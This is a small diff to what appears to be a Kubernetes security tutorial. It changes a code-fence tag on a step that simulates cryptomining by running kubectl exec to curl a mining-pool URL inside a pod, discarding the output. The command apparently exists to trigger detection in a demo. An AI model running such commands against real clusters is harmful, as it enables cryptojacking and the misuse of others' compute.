@@ -22,7 +22,7 @@ $ kubectl exec crypto -n other -- bash -c 'apt update && apt install -y curl'
 
 Next lets download the crypto mining process but dump the output to `/dev/null`:
 
-```bash
+```bash test=false
 $ kubectl exec crypto -n other -- bash -c 'curl -s -o /dev/null http://pool.minergate.com/zaq12wsxcde34rfvbgt56yhnmju78iklo90p && echo "Done!"'
 ```
 
